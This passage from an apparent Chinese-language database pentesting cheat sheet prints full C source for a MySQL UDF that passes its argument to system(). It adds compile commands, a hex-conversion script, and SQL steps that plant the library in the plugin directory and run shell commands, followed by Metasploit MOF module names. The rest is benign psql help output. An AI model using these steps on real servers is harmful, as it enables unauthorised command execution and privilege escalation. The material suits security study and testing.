class="comment">// 1 for maybe_null args</span></span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_udf_init</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>            maybe_null; <span class="comment">// 1 if func can return NULL</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        decimals;   <span class="comment">// for real functions</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>       max_length; <span class="comment">// for string functions</span></span><br><span class="line">    <span class="keyword">char</span>            *ptr;       <span class="comment">// free ptr for func data</span></span><br><span class="line">    <span class="keyword">char</span>            const_item; <span class="comment">// 0 if result is constant</span></span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_system</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="keyword">char</span> *is_null, <span class="keyword">char</span> *error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (args-&gt;arg_count != <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(args-&gt;args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">do_system_init</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="keyword">char</span> *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g -c raptor_udf2.c</span><br><span class="line">$ gcc -g -shared -W1,-soname,raptor_udf2<span class="selector-class">.so</span> -o raptor_udf2<span class="selector-class">.so</span> raptor_udf2<span class="selector-class">.o</span> -lc</span><br></pre></td></tr></table></figure>
+<p>将上面的代码编译成一个这样的库文件。接下来，请转换为一个十六进制字符串:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://www.exploit-db.com/exploits/1518/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> How to upload UDF DLL into mysql server ?</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> show VARIABLES;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> select @@plugin_dir;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELECT CHAR (...) INTO DUMPFILE <span class="string">'/usr/lib/mysql/plugin/lib_mysqludf_sys.so'</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELECT 0xnnnnn INTO DUMPFILE <span class="string">'/usr/lib/mysql/plugin/lib_mysqludf_sys.so'</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> drop <span class="keyword">function</span> <span class="keyword">if</span> exists do_system</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">'lib_mysqludf_sys.so'</span>;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> select sys_exec(<span class="string">'id'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> How to Compile UDF Dll ?</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gcc -g -c raptor_udf2.c</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def convert(filename):</span><br><span class="line">    with open(filename) as f:</span><br><span class="line">        print(binascii.hexlify(f.read()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    if len(sys.argv) != 2:</span><br><span class="line">        print("python &#123;&#125; /path/to/lib_mysqludf_sys.so".format(sys.argv[0]))</span><br><span class="line">    else:</span><br><span class="line">        convert(sys.argv[1])</span><br></pre></td></tr></table></figure>
+<p>上传该文件, 并用mysql用户定义一个函数 <strong>do_system</strong>.</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; <span class="keyword">select</span> @@plugin_dir;</span><br><span class="line">mysql &gt; <span class="keyword">SELECT</span> <span class="number">0x7f45</span>.......<span class="number">.0000</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">'/usr/lib/mysql/plugin/lib_mysqludf_sys.so'</span></span><br><span class="line">mysql &gt; <span class="keyword">drop</span> <span class="keyword">function</span> <span class="keyword">if</span> <span class="keyword">exists</span> do_system</span><br><span class="line">mysql &gt; <span class="keyword">create</span> <span class="keyword">function</span> do_system returns integer soname <span class="string">'lib_mysqludf_sys.so'</span>;</span><br><span class="line">mysql &gt; <span class="keyword">select</span> do_system(<span class="string">'id &gt; /tmp/result.log'</span>);</span><br><span class="line">mysql &gt; <span class="keyword">select</span> load_file(<span class="string">'/tmp/result.log'</span>);</span><br></pre></td></tr></table></figure>
+<p>####MOF权限提升####</p>
+<p>如果mysql部署在windows上，可以尝试用msf:</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt;</span><br><span class="line"><span class="keyword">use</span> exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="keyword">use</span> exploit/windows/mysql/mysql_start_up</span><br><span class="line"><span class="keyword">use</span> exploit/windows/mysql/scrutinizer_upload_exec</span><br><span class="line"><span class="keyword">use</span> exploit/windows/mysql/mysql_payload</span><br><span class="line"><span class="keyword">use</span> exploit/windows/mysql/mysql_yassl_hello</span><br></pre></td></tr></table></figure>
+<p>如果有足够的权限，还可以将数据写入os文件（启动，cron等）。</p>
+<p>####参考链接####</p>
+<ol>
+<li><a href="http://www.mysqltutorial.org/mysql-cheat-sheet.aspx" target="_blank" rel="noopener">http://www.mysqltutorial.org/mysql-cheat-sheet.aspx</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></li>
+<li><a href="https://www.rapid7.com/db/modules/exploit/windows/mysql/mysql_mof" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/windows/mysql/mysql_mof</a></li>
+<li><a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a></li>
+</ol>
+<h3 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h3><p>####数据库连接####</p>
+<p>请连接到<strong>postgresql</strong>数据库,  </p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lab</span>:~/ $ psql -<span class="keyword">h</span> 127.0.0.1 -<span class="keyword">U</span> postgres -<span class="built_in">W</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>####数据库命令####</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">postgres</span>=# help</span><br><span class="line">You are using psql, the command-line<span class="built_in"> interface </span><span class="keyword">to</span> PostgreSQL.</span><br><span class="line">Type:  \copyright <span class="keyword">for</span> distribution terms</span><br><span class="line">       \h <span class="keyword">for</span> help with SQL commands</span><br><span class="line">       \? <span class="keyword">for</span> help with psql commands</span><br><span class="line">       \g <span class="keyword">or</span> terminate with semicolon <span class="keyword">to</span> execute query</span><br><span class="line">       \q <span class="keyword">to</span> quit</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">postgres=# \h</span><br><span class="line">Available help:</span><br><span class="line">  ABORT                            <span class="keyword">CREATE</span> FOREIGN DATA WRAPPER      <span class="keyword">DROP</span> SEQUENCE</span><br><span class="line">  <span class="keyword">ALTER</span> AGGREGATE                  <span class="keyword">CREATE</span> FOREIGN TABLE             <span class="keyword">DROP</span> SERVER</span><br><span class="line">  <span class="keyword">ALTER</span> COLLATION                  <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span>                  <span class="keyword">DROP</span> TABLE</span><br><span class="line">  <span class="keyword">ALTER</span> CONVERSION                 <span class="keyword">CREATE</span> <span class="keyword">GROUP</span>                     <span class="keyword">DROP</span> TABLESPACE</span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">DATABASE</span>                   <span class="keyword">CREATE</span> <span class="keyword">INDEX</span>                     <span class="keyword">DROP</span> TEXT SEARCH CONFIGURATION</span><br><span class="line">  <span class="keyword">ALTER</span> DEFAULT PRIVILEGES         <span class="keyword">CREATE</span> LANGUAGE                  <span class="keyword">DROP</span> TEXT SEARCH DICTIONARY</span><br><span class="line">  <span class="keyword">ALTER</span> DOMAIN                     <span class="keyword">CREATE</span> <span class="keyword">MATERIALIZED</span> <span class="keyword">VIEW</span>         <span class="keyword">DROP</span> TEXT SEARCH PARSER</span><br><span class="line">  <span class="keyword">ALTER</span> EVENT <span class="keyword">TRIGGER</span>              <span class="keyword">CREATE</span> OPERATOR                  <span class="keyword">DROP</span> TEXT SEARCH TEMPLATE</span><br><span class="line">  <span class="keyword">ALTER</span> EXTENSION                  <span class="keyword">CREATE</span> OPERATOR CLASS            <span class="keyword">DROP</span> <span class="keyword">TRIGGER</span></span><br><span class="line">  <span class="keyword">ALTER</span> FOREIGN DATA WRAPPER       <span class="keyword">CREATE</span> OPERATOR FAMILY           <span class="keyword">DROP</span> <span class="built_in">TYPE</span></span><br><span class="line">  <span class="keyword">ALTER</span> FOREIGN TABLE              <span class="keyword">CREATE</span> <span class="keyword">ROLE</span>                      <span class="keyword">DROP</span> <span class="keyword">USER</span></span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">FUNCTION</span>                   <span class="keyword">CREATE</span> RULE                      <span class="keyword">DROP</span> <span class="keyword">USER</span> <span class="keyword">MAPPING</span></span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">GROUP</span>                      <span class="keyword">CREATE</span> <span class="keyword">SCHEMA</span>                    <span class="keyword">DROP</span> <span class="keyword">VIEW</span></span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">INDEX</span>                      <span class="keyword">CREATE</span> SEQUENCE                  <span class="keyword">END</span></span><br><span class="line">  <span class="keyword">ALTER</span> LANGUAGE                   <span class="keyword">CREATE</span> SERVER                    <span class="keyword">EXECUTE</span></span><br><span class="line">  <span class="keyword">ALTER</span> LARGE <span class="keyword">OBJECT</span>               <span class="keyword">CREATE</span> TABLE                     <span class="keyword">EXPLAIN</span></span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">MATERIALIZED</span> <span class="keyword">VIEW</span>          <span class="keyword">CREATE</span> TABLE <span class="keyword">AS</span>                  <span class="keyword">FETCH</span></span><br><span class="line">  <span class="keyword">ALTER</span> OPERATOR                   <span class="keyword">CREATE</span> TABLESPACE                <span class="keyword">GRANT</span></span><br><span class="line">  <span class="keyword">ALTER</span> OPERATOR CLASS             <span class="keyword">CREATE</span> TEXT SEARCH CONFIGURATION <span class="keyword">INSERT</span></span><br><span class="line">  <span class="keyword">ALTER</span> OPERATOR FAMILY            <span class="keyword">CREATE</span> TEXT SEARCH DICTIONARY    LISTEN</span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">ROLE</span>                       <span class="keyword">CREATE</span> TEXT SEARCH PARSER        LOAD</span><br><span class="line">  <span class="keyword">ALTER</span> RULE                       <span class="keyword">CREATE</span> TEXT SEARCH TEMPLATE      LOCK</span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">SCHEMA</span>                     <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span>                   MOVE</span><br><span class="line">  <span class="keyword">ALTER</span> SEQUENCE                   <span class="keyword">CREATE</span> <span class="built_in">TYPE</span>                      NOTIFY</span><br><span class="line">  <span class="keyword">ALTER</span> SERVER                     <span class="keyword">CREATE</span> <span class="keyword">USER</span>                      <span class="keyword">PREPARE</span></span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span>                     <span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="keyword">MAPPING</span>              <span class="keyword">PREPARE</span> <span class="keyword">TRANSACTION</span></span><br><span class="line">  <span class="keyword">ALTER</span> TABLE                      <span class="keyword">CREATE</span> <span class="keyword">VIEW</span>                      REASSIGN OWNED</span><br><span class="line">  <span class="keyword">ALTER</span> TABLESPACE                 DEALLOCATE                       REFRESH <span class="keyword">MATERIALIZED</span> <span class="keyword">VIEW</span></span><br><span class="line">  <span class="keyword">ALTER</span> TEXT SEARCH CONFIGURATION  <span class="keyword">DECLARE</span>                          REINDEX</span><br><span class="line">  <span class="keyword">ALTER</span> TEXT SEARCH DICTIONARY     <span class="keyword">DELETE</span>                           RELEASE SAVEPOINT</span><br><span class="line">  <span class="keyword">ALTER</span> TEXT SEARCH PARSER         DISCARD                          RESET</span><br><span class="line">  <span class="keyword">ALTER</span> TEXT SEARCH TEMPLATE       <span class="keyword">DO</span>                               <span class="keyword">REVOKE</span></span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">TRIGGER</span>                    <span class="keyword">DROP</span> AGGREGATE                   <span class="keyword">ROLLBACK</span></span><br><span class="line">  <span class="keyword">ALTER</span> <span class="built_in">TYPE</span>                       <span class="keyword">DROP</span> <span class="keyword">CAST</span>                        <span class="keyword">ROLLBACK</span> PREPARED</span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">USER</span>                       <span class="keyword">DROP</span> COLLATION                   <span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> SAVEPOINT</span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="keyword">MAPPING</span>               <span class="keyword">DROP</span> CONVERSION                  SAVEPOINT</span><br><span class="line">  <span class="keyword">ALTER</span> <span class="keyword">VIEW</span>                       <span class="keyword">DROP</span> <span class="keyword">DATABASE</span>                    SECURITY LABEL</span><br><span class="line">  <span class="keyword">ANALYZE</span>                          <span class="keyword">DROP</span> DOMAIN                      <span class="keyword">SELECT</span></span><br><span class="line">  <span class="keyword">BEGIN</span>                            <span class="keyword">DROP</span> EVENT <span class="keyword">TRIGGER</span>               <span class="keyword">SELECT</span> <span class="keyword">INTO</span></span><br><span class="line">  CHECKPOINT                       <span class="keyword">DROP</span> EXTENSION                   <span class="keyword">SET</span></span><br><span class="line">  CLOSE                            <span class="keyword">DROP</span> FOREIGN DATA WRAPPER        <span class="keyword">SET</span> CONSTRAINTS</span><br><span class="line">  <span class="keyword">CLUSTER</span>                          <span class="keyword">DROP</span> FOREIGN TABLE               <span class="keyword">SET</span> <span class="keyword">ROLE</span></span><br><span class="line">  COMMENT                          <span class="keyword">DROP</span> <span class="keyword">FUNCTION</span>                    <span class="keyword">SET</span> SESSION AUTHORIZATION</span><br><span class="line">  <span class="keyword">COMMIT</span>                           <span class="keyword">DROP</span> <span class="keyword">GROUP</span>                       <span class="keyword">SET</span> <span class="keyword">TRANSACTION</span></span><br><span class="line">  <span class="keyword">COMMIT</span> PREPARED                  <span class="keyword">DROP</span> <span class="keyword">INDEX</span>                       <span class="keyword">SHOW</span></span><br><span class="line">  COPY                             <span class="keyword">DROP</span> LANGUAGE                    <span class="keyword">START</span> <span class="keyword">TRANSACTION</span></span><br><span class="line">  <span class="keyword">CREATE</span> AGGREGATE                 <span class="keyword">DROP</span> <span class="keyword">MATERIALIZED</span> <span class="keyword">VIEW</span>           TABLE</span><br><span class="line">  <span class="keyword">CREATE</span> <span class="keyword">CAST</span>                      <span class="keyword">DROP</span> OPERATOR                    <span class="keyword">TRUNCATE</span></span><br><span class="line">  <span class="keyword">CREATE</span> COLLATION                 <span class="keyword">DROP</span> OPERATOR CLASS              UNLISTEN</span><br><span class="line">  <span class="keyword">CREATE</span> CONVERSION                <span class="keyword">DROP</span> OPERATOR FAMILY             <span class="keyword">UPDATE</span></span><br><span class="line">  <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span>                  <span class="keyword">DROP</span> OWNED                       VACUUM</span><br><span class="line">  <span class="keyword">CREATE</span> DOMAIN                    <span class="keyword">DROP</span> <span class="keyword">ROLE</span>                        <span class="keyword">VALUES</span></span><br><span class="line">  <span class="keyword">CREATE</span> EVENT <span class="keyword">TRIGGER</span>             <span class="keyword">DROP</span> RULE                        <span class="keyword">WITH</span></span><br><span class="line">  <span class="keyword">CREATE</span> EXTENSION                 <span class="keyword">DROP</span> <span class="keyword">SCHEMA</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">postgres=# \?</span><br><span class="line">General</span><br><span class="line">  \<span class="keyword">copyright</span>             show PostgreSQL usage and distribution terms</span><br><span class="line">  \<span class="keyword">g</span> [<span class="keyword">FILE</span>] or ;         execute <span class="keyword">query</span> (and send results to <span class="keyword">file</span> or |pipe)</span><br><span class="line">  \gset [PREFIX]         execute <span class="keyword">query</span> and store results <span class="keyword">in</span> psql variables</span><br><span class="line">  \<span class="keyword">h</span> [NAME]              <span class="keyword">help</span> <span class="keyword">on</span> <span class="keyword">syntax</span> of SQL commands, * <span class="keyword">for</span> all commands</span><br><span class="line">  \q                     quit psql</span><br><span class="line">  \watch [SEC]           execute <span class="keyword">query</span> every SEC seconds</span><br><span class="line"></span><br><span class="line"><span class="keyword">Query</span> Buffer</span><br><span class="line">  \<span class="keyword">e</span> [<span class="keyword">FILE</span>] [<span class="keyword">LINE</span>]       <span class="keyword">edit</span> the <span class="keyword">query</span> buffer (or <span class="keyword">file</span>) with external editor</span><br><span class="line">  \ef [FUNCNAME [<span class="keyword">LINE</span>]]  <span class="keyword">edit</span> function definition with external editor</span><br><span class="line">  \p                     show the contents of the <span class="keyword">query</span> buffer</span><br><span class="line">  \r                     reset (<span class="keyword">clear</span>) the <span class="keyword">query</span> buffer</span><br><span class="line">  \s [<span class="keyword">FILE</span>]              <span class="keyword">display</span> history or <span class="keyword">save</span> it to <span class="keyword">file</span></span><br><span class="line">  \w <span class="keyword">FILE</span>                write <span class="keyword">query</span> buffer to <span class="keyword">file</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Input</span>/Output</span><br><span class="line">  \<span class="keyword">copy</span> ...              perform SQL <span class="keyword">COPY</span> with data stream to the client host</span><br><span class="line">  \echo [STRING]         write string to standard output</span><br><span class="line">  \i <span class="keyword">FILE</span>                execute commands from <span class="keyword">file</span></span><br><span class="line">  \<span class="keyword">ir</span> <span class="keyword">FILE</span>               <span class="keyword">as</span> \i, but relative to location of current script</span><br><span class="line">  \o [<span class="keyword">FILE</span>]              send all <span class="keyword">query</span> results to <span class="keyword">file</span> or |pipe</span><br><span class="line">  \qecho [STRING]        write string to <span class="keyword">query</span> output stream (see \o)</span><br><span class="line"></span><br><span class="line">Informational</span><br><span class="line">  (options: S = show system objects, + = additional detail)</span><br><span class="line">  \<span class="keyword">d</span>[S+]                 <span class="keyword">list</span> tables, views, and sequences</span><br><span class="line">  \<span class="keyword">d</span>[S+]  NAME           <span class="keyword">describe</span> <span class="keyword">table</span>, <span class="keyword">view</span>, sequence, or <span class="built_in">index</span></span><br><span class="line">  \da[S]  [PATTERN]      <span class="keyword">list</span> aggregates</span><br><span class="line">  \<span class="keyword">db</span>[+]  [PATTERN]      <span class="keyword">list</span> tablespaces</span><br><span class="line">  \dc[S+] [PATTERN]      <span class="keyword">list</span> conversions</span><br><span class="line">  \dC[+]  [PATTERN]      <span class="keyword">list</span> casts</span><br><span class="line">  \dd[S]  [PATTERN]      show object descriptions not displayed elsewhere</span><br><span class="line">  \ddp    [PATTERN]      <span class="keyword">list</span> default privileges</span><br><span class="line">  \dD[S+] [PATTERN]      <span class="keyword">list</span> domains</span><br><span class="line">  \det[+] [PATTERN]      <span class="keyword">list</span> foreign tables</span><br><span class="line">  \<span class="keyword">des</span>[+] [PATTERN]      <span class="keyword">list</span> foreign servers</span><br><span class="line">  \deu[+] [PATTERN]      <span class="keyword">list</span> user mappings</span><br><span class="line">  \dew[+] [PATTERN]      <span class="keyword">list</span> foreign-data wrappers</span><br><span class="line">  \df[antw][S+] [PATRN]  <span class="keyword">list</span> [only agg/normal/trigger/<span class="keyword">window</span>] functions</span><br><span class="line">  \dF[+]  [PATTERN]      <span class="keyword">list</span> text <span class="keyword">search</span> configurations</span><br><span class="line">  \dFd[+] [PATTERN]      <span class="keyword">list</span> text <span class="keyword">search</span> dictionaries</span><br><span class="line">  \dFp[+] [PATTERN]      <span class="keyword">list</span> text <span class="keyword">search</span> parsers</span><br><span class="line">  \dFt[+] [PATTERN]      <span class="keyword">list</span> text <span class="keyword">search</span> templates</span><br><span class="line">  \dg[+]  [PATTERN]      <span class="keyword">list</span> roles</span><br><span class="line">  \<span class="keyword">di</span>[S+] [PATTERN]      <span class="keyword">list</span> indexes</span><br><span class="line">  \dl                    <span class="keyword">list</span> large objects, same <span class="keyword">as</span> \lo_list</span><br><span class="line">  \dL[S+] [PATTERN]      <span class="keyword">list</span> procedural languages</span><br><span class="line">  \dm[S+] [PATTERN]      <span class="keyword">list</span> materialized views</span><br><span class="line">  \dn[S+] [PATTERN]      <span class="keyword">list</span> schemas</span><br><span class="line">  \<span class="keyword">do</span>[S]  [PATTERN]      <span class="keyword">list</span> operators</span><br><span class="line">  \<span class="keyword">dO</span>[S+] [PATTERN]      <span class="keyword">list</span> collations</span><br><span class="line">  \dp     [PATTERN]      <span class="keyword">list</span> <span class="keyword">table</span>, <span class="keyword">view</span>, and sequence access privileges</span><br><span class="line">  \drds [PATRN1 [PATRN2]] <span class="keyword">list</span> per-database role settings</span><br><span class="line">  \<span class="keyword">ds</span>[S+] [PATTERN]      <span class="keyword">list</span> sequences</span><br><span class="line">  \dt[S+] [PATTERN]      <span class="keyword">list</span> tables</span><br><span class="line">  \dT[S+] [PATTERN]      <span class="keyword">list</span> data types</span><br><span class="line">  \du[+]  [PATTERN]      <span class="keyword">list</span> roles</span><br><span class="line">  \dv[S+] [PATTERN]      <span class="keyword">list</span> views</span><br><span class="line">  \<span class="keyword">dE</span>[S+] [PATTERN]      <span class="keyword">list</span> foreign tables</span><br><span class="line">  \dx[+]  [PATTERN]      <span class="keyword">list</span> extensions</span><br><span class="line">  \dy     [PATTERN]      <span class="keyword">list</span> event triggers</span><br><span class="line">  \<span class="keyword">l</span>[+]   [PATTERN]      <span class="keyword">list</span> databases</span><br><span class="line">  \sf[+] FUNCNAME        show a function's definition</span><br><span class="line">  \z      [PATTERN]      same <span class="keyword">as</span> \dp</span><br><span class="line"></span><br><span class="line">Formatting</span><br><span class="line">  \a                     toggle between unaligned and aligned output mode</span><br><span class="line">  \C [STRING]            <span class="keyword">set</span> <span class="keyword">table</span> title, or unset <span class="keyword">if</span> none</span><br><span class="line">  \f [STRING]            show or <span class="keyword">set</span> field separator <span class="keyword">for</span> unaligned <span class="keyword">query</span> output</span><br><span class="line">  \<span class="keyword">H</span>                     toggle HTML output mode (currently off)</span><br><span class="line">  \pset [NAME [VALUE]]   <span class="keyword">set</span> <span class="keyword">table</span> output option</span><br><span class="line">                         (NAME := &#123;<span class="keyword">format</span>|border|expanded|fieldsep|fieldsep_zero|footer|null|</span><br><span class="line">                         numericlocale|recordsep|recordsep_zero|tuples_only|title|tableattr|pager&#125;)</span><br><span class="line">  \t [<span class="keyword">on</span>|off]            show only rows (currently off)</span><br><span class="line">  \T [STRING]            <span class="keyword">set</span> HTML &lt;<span class="keyword">table</span>&gt; tag attributes, or unset <span class="keyword">if</span> none</span><br><span class="line">  \x [<span class="keyword">on</span>|off|auto]       toggle expanded output (currently off)</span><br><span class="line"></span><br><span class="line">Connection</span><br><span class="line">  \c[onnect] &#123;[DBNAME|- USER|- HOST|- PORT|-] | conninfo&#125;</span><br><span class="line">                         connect to new database (currently <span class="string">"postgres"</span>)</span><br><span class="line">  \encoding [ENCODING]   show or <span class="keyword">set</span> client encoding</span><br><span class="line">  \password [USERNAME]   securely change the password <span class="keyword">for</span> a user</span><br><span class="line">  \conninfo              <span class="keyword">display</span> information <span class="keyword">about</span> current connection</span><br><span class="line"></span><br><span class="line">Operating System</span><br><span class="line">  \<span class="keyword">cd</span> [<span class="keyword">DIR</span>]              change the current working directory</span><br><span class="line">  \setenv NAME [VALUE]   <span class="keyword">set</span> or unset environment variable</span><br><span class="line">  